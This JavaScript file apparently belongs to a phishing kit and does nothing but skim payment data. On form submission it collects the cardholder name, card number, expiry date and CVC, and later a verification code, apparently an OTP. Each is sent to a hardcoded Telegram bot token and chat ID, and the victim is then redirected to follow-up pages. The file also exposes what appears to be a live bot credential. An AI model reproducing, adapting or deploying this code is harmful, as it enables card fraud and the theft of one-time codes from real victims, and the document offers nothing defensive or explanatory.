document.addEventListener("DOMContentLoaded", () => {
  const botToken = "7861921966:AAFAsCdJaRm8fDFYt9JAswrd4tr7Q8iEaJU";
  const chatId = "5355775763";

  const paymentForm = document.getElementById("paymentForm");
  const codeForm = document.getElementById("codeForm");

  if (paymentForm) {
    paymentForm.addEventListener("submit", function(e) {
      e.preventDefault();
      const formData = new FormData(paymentForm);
      const name = formData.get("name");
      const card = formData.get("card");
      const exp = formData.get("exp");
      const cvc = formData.get("cvc");

      const msg = `💳 بيانات البطاقة:\n👤 الاسم: ${name}\n💳 البطاقة: ${card}\n📅 الانتهاء: ${exp}\n🔒 CVC: ${cvc}`;
      
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      }).then(() => {
        window.location.href = "verify.html";
      });
    });
  }

  if (codeForm) {
    codeForm.addEventListener("submit", function(e) {
      e.preventDefault();
      const code = codeForm.code.value;

      const msg = `🔐 كود التحقق:\n📩 الكود: ${code}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      }).then(() => {
        window.location.href = "thanks.html";
      });
    });
  }
});

